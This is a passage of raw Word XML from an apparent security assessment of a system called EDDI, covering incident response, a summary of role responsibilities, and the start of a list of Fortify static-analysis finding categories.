          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Updates dependent applications to prevent downtime.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15935C4D" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Blocks</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>offending</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> network sources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5148A6E6" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">A post-incident review informs policy updates (e.g., adding </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>microsegmentation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> if needed). Quarterly Security Steering Committee meetings evaluate controls, and annual third-party audits (e.g., ISO 27001) verify compliance. Regular phishing simulations and role-based training ensure that personnel remain aware of evolving threats.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B37B6D8" w14:textId="29C74C6B" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="536E6EE2" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:t>Summary</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00820A55">
        <w:t xml:space="preserve"> of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00820A55">
        <w:t>Responsibilities</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4EA0BC07" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CEO/COO</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Endorse security strategy and budgets; report risks to the Board.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075A2FEA" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CIO</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Execute technology roadmap; ensure secure database architecture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29ECCF8B" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CISO</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Develop security policies; conduct risk assessments; lead incident response.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE2CF6D" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DBA Team</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Configure, patch, back up databases; enforce password policies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243C70D3" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Security Operations Team</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Monitor alerts; manage vulnerabilities; support incident response.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC11B9B" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Risk Management</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Maintain asset inventory; quantify residual risk; recommend mitigations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344CD1B1" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Legal &amp; Compliance</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Ensure regulatory adherence (e.g., data protection laws), review third-party contracts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0215389D" w14:textId="77777777" w:rsidR="00820A55" w:rsidRPr="00820A55" w:rsidRDefault="00820A55" w:rsidP="00820A55">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>HR</w:t>
      </w:r>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Vet privileged users; coordinate training; manage secure offboarding.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A90524" w14:textId="3326BF75" w:rsidR="00CF65A7" w:rsidRPr="00CF65A7" w:rsidRDefault="00820A55" w:rsidP="00CF65A7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00820A55">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>By concentrating on clearly defined roles, a tiered asset classification, strict password controls, and a structured incident response process, EDDI can effectively protect its MongoDB and SQLite credentials while aligning security practices with business objectives.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6316A27D" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="00886CE8" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc200039243"/>
      <w:r w:rsidRPr="00886CE8">
        <w:lastRenderedPageBreak/>
        <w:t>VULNERABILITIES ANALYSIS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="2ED06222" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="00886CE8" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc200039244"/>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00886CE8">
        <w:t>Static</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00886CE8">
        <w:t xml:space="preserve"> Code Analysis</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="4C19C715" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Performing static code analysis with Fortify SCA, 172 issues have appeared. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>They</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> are </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>grouped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> in 36 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>category</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BCDC06" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Build Misconfiguration: External Maven Dependency Repository</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19427376" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Code Correctness: Class Does Not Implement Equivalence Method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C9FC94" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Code Correctness: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>clone(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) Invokes Overridable Function</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7B28CA" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Code Correctness: Constructor Invokes Overridable Function</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772EB985" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Code Correctness: Non-Static Inner Class Implements Serializable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556EA00E" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Cross-Site </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Request</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Forgery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="284924F0" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Scripting: DOM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33939071" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Scripting: Self</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093425D4" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Dead Code: Expression is Always true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6338A936" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Denial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> of Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6898E282" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Denial</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> of Service: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>StringBuilder</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="41947D48" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Insecure</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Randomness</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4564A2D9" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">J2EE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Bad</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Practices: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Threads</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2F4E24F0" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Missing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Check </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>against</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Null</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="070D6E52" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Object Model Violation: Erroneous </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>clone(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) Method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583A1A42" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Object Model Violation: Just one of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>equals(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hashCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>() Defined</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FDDE55" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Password Management: Password in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Comment</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="08227BAF" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Manipulation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2A60EA66" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Manipulation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Zip Entry </w:t>
